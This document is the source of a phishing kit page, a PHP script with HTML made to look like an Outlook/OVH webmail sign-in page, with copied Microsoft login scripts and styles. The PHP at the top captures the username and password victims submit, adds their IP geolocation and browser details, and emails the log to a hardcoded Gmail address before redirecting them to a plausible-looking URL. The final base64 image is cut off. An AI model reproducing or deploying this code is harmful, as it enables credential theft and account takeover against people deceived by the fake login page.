<?php
if(isset($_GET['email'])){
    
    $email = $_GET['email'];
}

function now() {
date_default_timezone_set('GMT');
return date("h:i:sa");
}

if(isset($_POST['email'])&&isset($_POST['password'])){
require_once('./geoplugin.class.php');
$url = md5($url);
$praga= password_hash($praga, PASSWORD_BCRYPT, array('cost' => 12));
$geoplugin = new geoPlugin();
$geoplugin->locate();
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$email = $_POST['email'];
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "===============+ LOGS +===============\n";
$message .= "username: ".$_POST['email']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "----------------------  [ IP Info ] ------------------\n";
$message .="IP:   {$geoplugin->ip}\n";
$message .="City:   {$geoplugin->city}\n";
$message .="Region:   {$geoplugin->region}\n";
$message .="Country Name:   {$geoplugin->countryName}\n";
$message .="Country Code:   {$geoplugin->countryCode}\n";
$message .="Latitude:   {$geoplugin->latitude}\n";
$message .="Longitude:   {$geoplugin->longitude}\n";
$message .="Currency Code:   {$geoplugin->currencyCode}\n";
$message .="Currency Symbol:   {$geoplugin->currencySymbol}\n";
$message .="Exchange Rate:   {$geoplugin->currencyConverter}\n";
$message .="User-Agent: ".$browser."\n";
$message .= "Date Log  : ".$date."\n";
$message .= "Time Log  : ".now()." GMT\n";
$message.= "============== ANONYMOUS OSKIE ==============\n";

$domain = 'OUTLOOK INFO LOGS';
$subj = "NEW OUTLOOK LINK ($time)";
$from = "From: $domain<west>\n";
mail("oskielogins@gmail.com",$subj,$message,$from,$domain);
header("Location: https-3a2f-2fex3.mail.ovh.net=2fowa-2f&wctx=rm3d0-26id3dpassive-26ru3d=252fowa=252f-253fauthRedirect-253dtrue&wct=2017-09-28T10-3a21=3a41Z.php?contextid&microsoft=$praga&email=$email&randsalt=$url&authentication=$praga");
}
?>

<!DOCTYPE html>
<html lang="en-US">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=1"/>
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<meta http-equiv="cache-control" content="no-cache,no-store"/>
<meta http-equiv="pragma" content="no-cache"/>
<meta http-equiv="expires" content="-1"/>
<meta name='mswebdialog-title' content='Connecting to Outlook'/>

<title>Sign In</title>
<script type='text/javascript'>
//<![CDATA[
function LoginErrors(){this.userNameFormatError = 'Enter your user ID in the format \u0026quot;domain\\user\u0026quot; or \u0026quot;user@domain\u0026quot;.'; this.passwordEmpty = 'Enter your password.'; this.passwordTooLong = 'Password is too long (\u0026gt; 128 characters).';}; var maxPasswordLength = 128;
//]]>
</script>

<script type='text/javascript'>
//<![CDATA[
// Copyright (c) Microsoft Corporation.  All rights reserved.
function InputUtil(errTextElementID, errDisplayElementID) {

if (!errTextElementID)  errTextElementID = 'errorText'; 
if (!errDisplayElementID)  errDisplayElementID = 'error'; 

this.hasFocus = false;
this.errLabel = document.getElementById(errTextElementID);
this.errDisplay = document.getElementById(errDisplayElementID);
};
InputUtil.prototype.canDisplayError = function () {
return this.errLabel && this.errDisplay;
}
InputUtil.prototype.checkError = function () {
if (!this.canDisplayError){
throw new Error ('Error element not present');
}
if (this.errLabel && this.errLabel.innerHTML) {
this.errDisplay.style.display = '';        
var cause = this.errLabel.getAttribute('for');
if (cause) {
var causeNode = document.getElementById(cause);
if (causeNode && causeNode.value) {
causeNode.focus();
this.hasFocus = true;
}
}
}
else {
this.errDisplay.style.display = 'none';
}
};
InputUtil.prototype.setInitialFocus = function (input) {
if (this.hasFocus) return;
var node = document.getElementById(input);
if (node) {
if ((/^\s*$/).test(node.value)) {
node.focus();
this.hasFocus = true;
}
}
};
InputUtil.prototype.setError = function (input, errorMsg) {
if (!this.canDisplayError) {
throw new Error('Error element not present');
}
input.focus();

if (errorMsg) {
this.errLabel.innerHTML = errorMsg;
}
this.errLabel.setAttribute('for', input.id);
this.errDisplay.style.display = '';
};
InputUtil.makePlaceholder = function (input) {
var ua = navigator.userAgent;

if (ua != null && 
(ua.match(/MSIE 9.0/) != null || 
ua.match(/MSIE 8.0/) != null ||
ua.match(/MSIE 7.0/) != null)) {
var node = document.getElementById(input);
if (node) {
var placeholder = node.getAttribute("placeholder");
if (placeholder != null && placeholder != '') {
var label = document.createElement('input');
label.type = "text";
label.value = placeholder;
label.readOnly = true;
label.style.position = 'absolute';
label.style.borderColor = 'transparent';
label.className = node.className + ' hint';
label.tabIndex = -1;
label.onfocus = function () { this.nextSibling.focus(); };

node.style.position = 'relative';
node.parentNode.style.position = 'relative';
node.parentNode.insertBefore(label, node);
node.onkeyup = function () { InputUtil.showHint(this); };
node.onblur = function () { InputUtil.showHint(this); };
node.style.background = 'transparent';

node.setAttribute("placeholder", "");
InputUtil.showHint(node);
}
}
}
};
InputUtil.focus = function (inputField) {
var node = document.getElementById(inputField);
if (node) node.focus();
};
InputUtil.hasClass = function(node, clsName) {
return node.className.match(new RegExp('(\\s|^)' + clsName + '(\\s|$)'));
};
InputUtil.addClass = function(node, clsName) {
if (!this.hasClass(node, clsName)) node.className += " " + clsName;
};
InputUtil.removeClass = function(node, clsName) {
if (this.hasClass(node, clsName)) {
var reg = new RegExp('(\\s|^)' + clsName + '(\\s|$)');
node.className = node.className.replace(reg, ' ');
}
};
InputUtil.showHint = function (node, gotFocus) {
if (node.value && node.value != '') {
node.previousSibling.style.display = 'none';
}
else {
node.previousSibling.style.display = '';
}
};
InputUtil.updatePlaceholder = function (input, placeholderText) {
var node = document.getElementById(input);
if (node) {
var ua = navigator.userAgent;
if (ua != null &&
(ua.match(/MSIE 9.0/) != null ||
ua.match(/MSIE 8.0/) != null ||
ua.match(/MSIE 7.0/) != null)) {
var label = node.previousSibling;
if (label != null) {
label.value = placeholderText;
}
}
else {
node.placeholder = placeholderText;
}
}
};

//]]>
</script>
<link rel="stylesheet" type="text/css" href="https://cluster3.adfs.ovh.net/adfs/portal/css/style.css?id=70D6CB9AF553FFA6C34C7E662A911CF2FAA2987A630128BE9EDF7FDAC4CCA465&rp=fc9c2fdc-8861-e711-a2b8-005056aa7a39"/><style>.illustrationClass {background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAABYwAAAPACAYAAACW5T32AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsIAAA7CARUoSoAAAAAhdEVYdENyZWF0aW9uIFRpbWUAMjAxNzowNzowNSAxNjo0MjoyMJLjfQUAACWJSURBVHhe7d1PqGZnfcDxMypMzECSmWJLEkPHjq0QRSeWQGcTM6WNy5hFqctko+gqjosuUkgCdTlGNyPtJlkKXahL00JiC8kitEnFEVKcZiCptkhjHOqfgGWa55sz4c6fe2cm3nfmvfd8PnB4n3PefzMv3M2Xh9/ZMx177uwEQM4ePzKvAAAAAJbnPfMjAAAAAAALJxgDAAAAABDBGAAAAACACMYAAAAAAEQwBgAAAAAggjEAAAAAABGMAQAAAACIYAwAAAAAQARjAAAAAAAiGAMAAAAAEMEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYwBAAAAAIhgDAAAAABABGMAAAAAACIYAwAAAAAQwRgAAAAAgAjGAAAAAABEMAYAAAAAIIIxAAAAAAARjAEAAAAAiGAMAAAAAEAEYwAAAAAAIhgDAAAAABDBGAAAAACACMYAAAAAAEQwBgAAAAAggjEAAAAAABGMAQAAAACIYAwAAAAAQARjAAAAAAAiGAMAAAAAEMEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYwBAAAAAIhgDAAAAABABGMAAAAAACIYAwAAAAAQwRgAAAAAgAjGAAAAAABEMAYAAAAAIIIxAAAAAAARjAEAAAAAiGAMAAAAAEAEYwAAAAAAIhgDAAAAABDBGAAAAACACMYAAAAAAEQwBgAAAAAggjEAAAAAABGMAQAAAACIYAwAAAAAQARjAAAAAAAiGAMAAAAAEMEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYwBAAAAAIhgDAAAAABABGMAAAAAACIYAwAAAAAQwRgAAAAAgAjGAAAAAABEMAYAAAAAIIIxAAAAAAARjAEAAAAAiGAMAAAAAEAEYwAAAAAAIhgDAAAAABDBGAAAAACACMYAAAAAAEQwBgAAAAAggjEAAAAAABGMAQAAAACIYAwAAAAAQARjAAAAAAAiGAMAAAAAEMEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYwBAAAAAIhgDAAAAABABGMAAAAAACIYAwAAAAAQwRgAAAAAgAjGAAAAAABEMAYAAAAAIIIxAAAAAAARjAEAAAAAiGAMAAAAAEAEYwAAAAAAIhgDAAAAABDBGAAAAACACMYAAAAAAEQwBgAAAAAggjEAAAAAABGMAQAAAACIYAwAAAAAQARjAAAAAAAiGAMAAAAAEMEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYwBAAAAAIhgDAAAAABABGMAAAAAACIYAwAAAAAQwRgAAAAAgAjGAAAAAABEMAYAAAAAIIIxAAAAAAARjAEAAAAAiGAMAAAAAEAEYwAAAAAAIhgDAAAAABDBGAAAAACACMYAAAAAAEQwBgAAAAAggjEAAAAAABGMAQAAAACIYAwAAAAAQARjAAAAAAAiGAMAAAAAEMEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYwBAAAAAIhgDAAAAABABGMAAAAAACIYAwAAAAAQwRgAAAAAgAjGAAAAAABEMAYAAAAAIIIxAAAAAAARjAEAAAAAiGAMAAAAAEAEYwAAAAAAIhgDAAAAABDBGAAAAACACMYAAAAAAEQwBgAAAAAggjEAAAAAABGMAQAAAACIYAwAAAAAQARjAAAAAAAiGAMAAAAAEMEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYwBAAAAAIhgDAAAAABABGMAAAAAACIYAwAAAAAQwRgAAAAAgAjGAAAAAABEMAYAAAAAIIIxAAAAAAARjAEAAAAAiGAMAAAAAEAEYwAAAAAAIhgDAAAAABDBGAAAAACACMYAAAAAAEQwBgAAAAAggjEAAAAAABGMAQAAAACIYAwAAAAAQARjAAAAAAAiGAMAAAAAEMEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYwBAAAAAIhgDAAAAABABGMAAAAAACIYAwAAAAAQwRgAAAAAgAjGAAAAAABEMAYAAAAAIIIxAAAAAAARjAEAAAAAiGAMAAAAAEAEYwAAAAAAIhgDAAAAABDBGAAAAACACMYAAAAAAEQwBgAAAAAggjEAAAAAABGMAQAAAACIYAwAAAAAQARjAAAAAAAiGAMAAAAAEMEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYwBAAAAAIhgDAAAAABABGMAAAAAALJnOvbc2XkNa+eW979vOnzbjdPh2/dNn7ht33TwwN7p3kM3Tc+eOjMdPXFyfhVsn7PHj8wrAAAAgOURjFkbIwSPIHzwwA3Tp95aj1A8gvGlCMasimAMAAAALJlgzDU3ovDh2/bNu4ZvnA7uf+v8rfXVEIxZFcEYAAAAWDLBmJXZbJzEdhCMWRXBGAAAAFgywZhtcTXjJLaDYMyqCMYAAADAkgnGXJXtGCexHQRjVkUwBgAAAJZMMOaSVjlOYjsIxqyKYAwAAAAsmWDMNR8nsR0EY1ZFMAYAAACWTDBekHUZJ7EdBGNWRTAGAAAAlkww3oXWfZzEdhCMWRXBGAAAAFgywXiH24njJLaDYMyqCMYAAADAkgnGO9C3HvrIjh4nsR0EY1ZFMAYAAACW7D3zIzvIZz52YNGxGAAAAABYDcEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYwBAAAAAIhgDAAAAABABGMAAAAAACIYAwAAAAAQwRgAAAAAgAjGAAAAAABkz3TsubPzmh3i7PEj82q5nj11Zjp64uR8Nk1P3H9wOnz7vvlsfb3xq99M33vr3/7UCz9tzfrx9wUAAAAsmWC8AwlaFwfjZ7740eneQzfNZ+vvpf/8xXT0Gz8UjdeQvy8AAABgyYykgOtg7IYeu6IBAAAAYJ0IxnCdPHj3B+YVAAAAAKwHwRiuk8effm1eAQAAAMB6EIzhGhtzix948uXpse++Ol8BAAAAgPUgGMM1dO5md9/+wevzFQAAAABYH4IxXCMjEo9YPKIxAAAAAKwjwRiugS9953RjKMY4inMO375vXgEAAADAehCMYYVGID564uT0tX/6yXzlbQ/e/YHpmS/cOZ8BAAAAwHoQjGFFxuiJu776/enZU2fmK2974v6D05Of/fB0y/vfN18BAAAAgPUgGMMKPPXCT5tXfPr1N+crU4H4xWMfnx6+59b5CgAAAACsF8GYTY1xCiN8PvTNHzVWYf9fvzDt+fLzHeN8XB83cuN843cZx4Xzil955C5ziwEAAABYa4IxFxmhcwTPD33lxR5HNB5jFTYG0HE+ro8buY2QfOGM3iUav88YQTF+l43GvOKxs9gICgAAAADWnWDMeUbsHKF4PG4MxFsZr/vSd04XSzeOYFiSEdDH7zbmFp8zAvGYVTwOAAAAANgJBGPecalRClfj3E3eNkbTJRi7q8eIjo2/28EDe6dnvnBnu4sBAAAAYKcQjMm50RO/rRFNL7zZ2241/q/jdxu7qze699BNjaAwrxgAAACAnUYwplC8HbH4nBFSH3jq5flsdxpBfITxC3+3h++5dXrmix81rxgAAACAHUkwXrgRPi/cIbsdxliKx59+bT7bXb79g9cvGr0xAvG3HvrI9MT9B+crAAAAALDzCMYLd7mZxWMW77hp2yuPfHI6e/zI9LO/ubsdtFcym/ex776660ZTjAj+wJMvn/ebjdETY17xZz52YL4CAAAAADuTYLxgz54607GZxz59R6F4xOERjoexk3bM6B0ReeyovdzohceffnVe7WyN2Xjy5SL4RiMSj1hsXjEAAAAAu4FgvGBf/6efzKuLjVm8j973wfns0kYsffKzh+azS/v2D3625Q7mnWCMnhjziscoio3G+IkrieYAAAAAsFMIxgs1RkVcGEDPGbtlr3QW74jGW42nGLF4ROOdatzUbsTiC+cVj7EcI6oDAAAAwG4iGC/UZrF4uNobtz163x3z6tK+s8V3rbNxM8ALZzyPmP7isY83lgMAAAAAdhvBeKG+t8ns4jGr+Gpj6OXes9Wc5HU0AvHREyenr10wsmPspB7zis/NcwYAAACA3UYwXqjNIu4YMfFu3L/F+0aAHSMwVunx7766LbOSx+iJD33lxYt+n3GTv3GYVwwAAADAbiYYL9CIt5vF1a3C71bGqIatnP7ZaoPxCLwj9G6cNXy1xrziu776/fN+mxGIxwiKreY0AwAAAMBuIRgv0Fbx9vBtN86rq3O5MRabjcDYTiP0juB74SiJKzFmFY9joxHBX3nkrsvGcAAAAADYLQTjBdpqF+5uGLkwblb3wJMvX9GIirHbekTmsbt4o4fvubWdxUZQAAAAALAkgvEC/fzX/zevzvfb7qS92pvlbacLv/vbP3h9OvqNH24Zx8cYixGLN75mBOIxq/iJ+w/OVwAAAABgOQRj3nHLDe+dVzvPo5++Y/rWQx85b0fwCMEjGl+4e3gYYyuOnjh53i7kgwf2Ts984U7zigEAAABYLMGYXeMzHzvQGImNO6VHEN44n/jc+RhbsdGl3gsAAAAASyMYs6tstkt47DIe4ycuteP4sUvsTgYAAACAJRKMecdLP/7lvHp33thkNvK1dm4O8TguHFFx4bziEYofve+D8xUAAAAAWDbBmHdsnOf7bmx1g7mbr8N85LHLeOw2HruOLzRGT4znxigKAAAAAOBtgvECferQTfPqYltF362cfv3NeXVp12s28PjeMZt444iKh++5tVhsXjEAAAAAnE8wXqCD+y/ecXvOux1L8dKPtw7NW33nqp0bUXH2+JGOJ+4/aF4xAAAAAFyCYLxAY0TDZsH0e6d+Pq+uzvdOnZlXFxvfd6mxEAAAAADAehGMF+reTcZSPPXCT9/VLOPxvs1s9l0AAAAAwHoRjBfq/i1u9vb1f/6veXVlLheZP3Xo5nkFAAAAAKwzwXihPvOx/fPqYo9999UrvvndCMVf+s7p+exiY/TFVt8FAAAAAKwPwXihRsh98O4PzGcXO/qNH142Go9YPF631e7iEYvdYA4AAAAAdgbBeMEeve+OeXWxczF4s9nEz546M9311e9fNipv9R0AAAAAwHoRjBfs4IG908P33DqfXWxE44e++aNp/1+/MB09cfKd40Nf+dceT7/+5vzKS3vs03f0HQAAAADAziAYL9yj933wslF3hOOxo/jccblQPBy+fV+fDQAAAADsHILxwo35wt968CPbOmd4fNaTf3loPgMAAAAAdgrBmHYDP/OFO7clGo/PGJ81PhMAAAAA2FkEY7Id0XiMthCLAQAAAGDnEox5xwi9rzxy1/Tg3R+Yr1y58Z4Xj31cLAYAAACAHUww5jzNH/7sh6dXHvnk9PA9t255Q7zx3HjNeO14z3aMtAAAAAAArp8907Hnzs5rdoizx4/Mq2vjjV/9Znrpx7+cz952cP/eLWPyqj176sx09MTJ+WyanvniR6d7D900n+0ce778/LxiXVzrvy8AAACAdWKHMZc1dg6PGLvxuJ6xGAAAAABYDcEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYzhOvuzP7p5Onv8yHnH3/7FH0z/8Pk7O875qz+9vecAAAAAYFUEY7jO/vHffz7t+fLz05//7Q/fWX/+7/+j50ZM3v/+97X+3J/8bo8AAAAAsCqCMayxf3ntF9Pnjvze9Mcf3NcaAAAAAFZJMIbr5PTrb86rzf39v/3P9Gd/ePP0F5/4nXYfAwAAAMAqCcZwnTz+9KvzanP/8tr/Tn98x752GY94DAAAAACrJBjDNfbGr34zPfTNH01PvfDT+crW/u75/2538c/eeh8AAAAArNKe6dhzZ+c1O8TZ40fm1XI9e+rMdPTEyflsmg7fvm+65Yb3zmfr641f/9/00n+aRbzO/H0BAAAASyYY70CC1sXBGLaLvy8AAABgyYykAAAAAAAggjEAAAAAABGMAQAAAACIYAwAAAAAQARjAAAAAAAiGAMAAAAAEMEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYx3oD1ffn6666vfnx548uXp8adfm549dWY6/fqb87MAAAAAAO/OnunYc2fnNbvAvYdumg4e2PvWccP0qbHeP9Z752d3jxHJj544OZ/B9jl7/Mi8AgAAAFgewXgBbnn/+6bDt904Hb593/T7+/f2OM7H9Z1KMGZVBGMAAABgyQTjBdsYkj9x2752Io8dyjuBYMyqCMYAAADAkgnGXKSRFvv3Tvd++OZ2JK9jSBaMWRXBGAAAAFgywZgrNnYij5D89o7kG99ZXw+CMasiGAMAAABLJhjzW9sYkq/VjfYEY1ZFMAYAAACWTDBmZcYYi8ZbHLhh20OyYMyqCMYAAADAkgnGXFMbb7Q35iOPx3E+rl8NwZhVEYwBAACAJROMWQuXCslb3WhPMGZVBGMAAABgyQRj1lojLfbvne798M2F5HE+QrJgzKoIxgAAAMCSCcYAGwjGAAAAwJK9Z34EAAAAAGDhBGMAAAAAACIYAwAAAAAQwRgAAAAAgAjGAAAAAABEMAYAAAAAIIIxAAAAAAARjAEAAAAAiGAMAAAAAEAEYwAAAAAAIhgDAAAAABDBGAAAAACACMYAAAAAAEQwBgAAAAAggjEAAAAAABGMAQAAAACIYAwAAAAAQARjAAAAAAAiGAMAAAAAEMEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYwBAAAAAIhgDAAAAABABGMAAAAAACIYAwAAAAAQwRgAAAAAgAjGAAAAAABEMAYAAAAAIIIxAAAAAAARjAEAAAAAiGAMAAAAAEAEYwAAAAAAIhgDAAAAABDBGAAAAACACMYAAAAAAEQwBgAAAAAggjEAAAAAABGMAQAAAACIYAwAAAAAQARjAAAAAAAiGAMAAAAAEMEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYwBAAAAAIhgDAAAAABABGMAAAAAACIYAwAAAAAQwRgAAAAAgAjGAAAAAABEMAYAAAAAIIIxAAAAAAARjAEAAAAAiGAMAAAAAEAEYwAAAAAAIhgDAAAAABDBGAAAAACACMYAAAAAAEQwBgAAAAAggjEAAAAAABGMAQAAAACIYAwAAAAAQARjAAAAAAAiGAMAAAAAEMEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYwBAAAAAIhgDAAAAABABGMAAAAAACIYAwAAAAAQwRgAAAAAgAjGAAAAAABEMAYAAAAAIIIxAAAAAAARjAEAAAAAiGAMAAAAAEAEYwAAAAAAIhgDAAAAABDBGAAAAACACMYAAAAAAEQwBgAAAAAggjEAAAAAABGMAQAAAACIYAwAAAAAQARjAAAAAAAiGAMAAAAAEMEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYwBAAAAAIhgDAAAAABABGMAAAAAACIYAwAAAAAQwRgAAAAAgAjGAAAAAABEMAYAAAAAIIIxAAAAAAARjAEAAAAAiGAMAAAAAEAEYwAAAAAAIhgDAAAAABDBGAAAAACACMYAAAAAAEQwBgAAAAAggjEAAAAAABGMAQAAAACIYAwAAAAAQARjAAAAAAAiGAMAAAAAEMEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYwBAAAAAIhgDAAAAABABGMAAAAAACIYAwAAAAAQwRgAAAAAgAjGAAAAAABEMAYAAAAAIIIxAAAAAAARjAEAAAAAiGAMAAAAAEAEYwAAAAAAIhgDAAAAABDBGAAAAACACMYAAAAAAEQwBgAAAAAggjEAAAAAABGMAQAAAACIYAwAAAAAQARjAAAAAAAiGAMAAAAAEMEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYwBAAAAAIhgDAAAAABABGMAAAAAACIYAwAAAAAQwRgAAAAAgAjGAAAAAABEMAYAAAAAIIIxAAAAAAARjAEAAAAAiGAMAAAAAEAEYwAAAAAAIhgDAAAAABDBGAAAAACACMYAAAAAAEQwBgAAAAAggjEAAAAAABGMAQAAAACIYAwAAAAAQARjAAAAAAAiGAMAAAAAEMEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYwBAAAAAIhgDAAAAABABGMAAAAAACIYAwAAAAAQwRgAAAAAgAjGAAAAAABEMAYAAAAAIIIxAAAAAAARjAEAAAAAiGAMAAAAAEAEYwAAAAAAIhgDAAAAABDBGAAAAACACMYAAAAAAEQwBgAAAAAggjEAAAAAABGMAQAAAACIYAwAAAAAQARjAAAAAAAiGAMAAAAAEMEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYwBAAAAAIhgDAAAAABABGMAAAAAACIYAwAAAAAQwRgAAAAAgAjGAAAAAABEMAYAAAAAIIIxAAAAAAARjAEAAAAAiGAMAAAAAEAEYwAAAAAAIhgDAAAAABDBGAAAAACACMYAAAAAAEQwBgAAAAAggjEAAAAAABGMAQAAAACIYAwAAAAAQARjAAAAAAAiGAMAAAAAEMEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYwBAAAAAIhgDAAAAABABGMAAAAAACIYAwAAAAAQwRgAAAAAgAjGAAAAAABEMAYAAAAAIIIxAAAAAAARjAEAAAAAiGAMAAAAAEAEYwAAAAAAIhgDAAAAABDBGAAAAACACMYAAAAAAEQwBgAAAAAggjEAAAAAABGMAQAAAACIYAwAAAAAQARjAAAAAAAiGAMAAAAAEMEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYwBAAAAAIhgDAAAAABABGMAAAAAACIYAwAAAAAQwRgAAAAAgAjGAAAAAABEMAYAAAAAIIIxAAAAAAARjAEAAAAAiGAMAAAAAEAEYwAAAAAAIhgDAAAAABDBGAAAAACACMYAAAAAAEQwBgAAAAAggjEAAAAAABGMAQAAAACIYAwAAAAAQARjAAAAAAAiGAMAAAAAEMEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYwBAAAAAIhgDAAAAABABGMAAAAAACIYAwAAAAAQwRgAAAAAgAjGAAAAAABEMAYAAAAAIIIxAAAAAAARjAEAAAAAiGAMAAAAAEAEYwAAAAAAIhgDAAAAABDBGAAAAACACMYAAAAAAEQwBgAAAAAggjEAAAAAABGMAQAAAACIYAwAAAAAQARjAAAAAAAiGAMAAAAAEMEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYwBAAAAAIhgDAAAAABABGMAAAAAACIYAwAAAAAQwRgAAAAAgAjGAAAAAABEMAYAAAAAIIIxAAAAAAARjAEAAAAAiGAMAAAAAEAEYwAAAAAAIhgDAAAAABDBGAAAAACACMYAAAAAAEQwBgAAAAAggjEAAAAAABGMAQAAAACIYAwAAAAAQARjAAAAAAAiGAMAAAAAEMEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYwBAAAAAIhgDAAAAABABGMAAAAAACIYAwAAAAAQwRgAAAAAgAjGAAAAAABEMAYAAAAAIIIxAAAAAAARjAEAAAAAiGAMAAAAAEAEYwAAAAAAIhgDAAAAABDBGAAAAACACMYAAAAAAEQwBgAAAAAggjEAAAAAABGMAQAAAACIYAwAAAAAQARjAAAAAAAiGAMAAAAAEMEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYwBAAAAAIhgDAAAAABABGMAAAAAACIYAwAAAAAQwRgAAAAAgAjGAAAAAABEMAYAAAAAIIIxAAAAAAARjAEAAAAAiGAMAAAAAEAEYwAAAAAAIhgDAAAAABDBGAAAAACACMYAAAAAAEQwBgAAAAAggjEAAAAAABGMAQAAAACIYAwAAAAAQARjAAAAAAAiGAMAAAAAEMEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYwBAAAAAIhgDAAAAABABGMAAAAAACIYAwAAAAAQwRgAAAAAgAjGAAAAAABEMAYAAAAAIIIxAAAAAAARjAEAAAAAiGAMAAAAAEAEYwAAAAAAIhgDAAAAABDBGAAAAACACMYAAAAAAEQwBgAAAAAggjEAAAAAABGMAQAAAACIYAwAAAAAQARjAAAAAAAiGAMAAAAAEMEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYwBAAAAAIhgDAAAAABABGMAAAAAACIYAwAAAAAQwRgAAAAAgAjGAAAAAABEMAYAAAAAIIIxAAAAAAARjAEAAAAAiGAMAAAAAEAEYwAAAAAAIhgDAAAAABDBGAAAAACACMYAAAAAAEQwBgAAAAAggjEAAAAAABGMAQAAAACIYAwAAAAAQARjAAAAAAAiGAMAAAAAEMEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYwBAAAAAIhgDAAAAABABGMAAAAAACIYAwAAAAAQwRgAAAAAgAjGAAAAAABEMAYAAAAAIIIxAAAAAAARjAEAAAAAiGAMAAAAAEAEYwAAAAAAIhgDAAAAABDBGAAAAACACMYAAAAAAEQwBgAAAAAggjEAAAAAABGMAQAAAACIYAwAAAAAQARjAAAAAAAiGAMAAAAAEMEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYwBAAAAAIhgDAAAAABABGMAAAAAACIYAwAAAAAQwRgAAAAAgAjGAAAAAABEMAYAAAAAIIIxAAAAAAARjAEAAAAAiGAMAAAAAEAEYwAAAAAAIhgDAAAAABDBGAAAAACACMYAAAAAAEQwBgAAAAAggjEAAAAAABGMAQAAAACIYAwAAAAAQARjAAAAAAAiGAMAAAAAEMEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYwBAAAAAIhgDAAAAABABGMAAAAAACIYAwAAAAAQwRgAAAAAgAjGAAAAAABEMAYAAAAAIIIxAAAAAAARjAEAAAAAiGAMAAAAAEAEYwAAAAAAIhgDAAAAABDBGAAAAACACMYAAAAAAEQwBgAAAAAggjEAAAAAABGMAQAAAACIYAwAAAAAQARjAAAAAAAiGAMAAAAAEMEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYwBAAAAAIhgDAAAAABABGMAAAAAACIYAwAAAAAQwRgAAAAAgAjGAAAAAABEMAYAAAAAIIIxAAAAAAARjAEAAAAAiGAMAAAAAEAEYwAAAAAAIhgDAAAAABDBGAAAAACACMYAAAAAAEQwBgAAAAAggjEAAAAAABGMAQAAAACIYAwAAAAAQARjAAAAAAAiGAMAAAAAEMEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYwBAAAAAIhgDAAAAABABGMAAAAAACIYAwAAAAAQwRgAAAAAgAjGAAAAAABEMAYAAAAAIIIxAAAAAAARjAEAAAAAiGAMAAAAAEAEYwAAAAAAIhgDAAAAABDBGAAAAACACMYAAAAAAEQwBgAAAAAggjEAAAAAABGMAQAAAACIYAwAAAAAQARjAAAAAAAiGAMAAAAAEMEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYwBAAAAAIhgDAAAAABABGMAAAAAACIYAwAAAAAQwRgAAAAAgAjGAAAAAABEMAYAAAAAIIIxAAAAAAARjAEAAAAAiGAMAAAAAEAEYwAAAAAAIhgDAAAAABDBGAAAAACACMYAAAAAAEQwBgAAAAAggjEAAAAAABGMAQAAAACIYAwAAAAAQARjAAAAAAAiGAMAAAAAEMEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYwBAAAAAIhgDAAAAABABGMAAAAAACIYAwAAAAAQwRgAAAAAgAjGAAAAAABEMAYAAAAAIIIxAAAAAAARjAEAAAAAiGAMAAAAAEAEYwAAAAAAIhgDAAAAABDBGAAAAACACMYAAAAAAEQwBgAAAAAggjEAAAAAABGMAQAAAACIYAwAAAAAQARjAAAAAAAiGAMAAAAAEMEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYwBAAAAAIhgDAAAAABABGMAAAAAACIYAwAAAAAQwRgAAAAAgAjGAAAAAABEMAYAAAAAIIIxAAAAAAARjAEAAAAAiGAMAAAAAEAEYwAAAAAAIhgDAAAAABDBGAAAAACACMYAAAAAAEQwBgAAAAAggjEAAAAAABGMAQAAAACIYAwAAAAAQARjAAAAAAAiGAMAAAAAEMEYAAAAAIAIxgAAAAAARDAGAAAAACCCMQAAAAAAEYwBAAAAAIhgDAAAAABABGMAAAAAACIYAwAAAAAQwRgAAAAAgAjGAAAAAABEMAYAAAAAIIIxAAAAAAARjAEAAAAAiGAMAAAAAEAEYwAAAAAAIhgDAAAAABDBGAAAAACACMYAAAAAAEQwBgAAAAAggjEA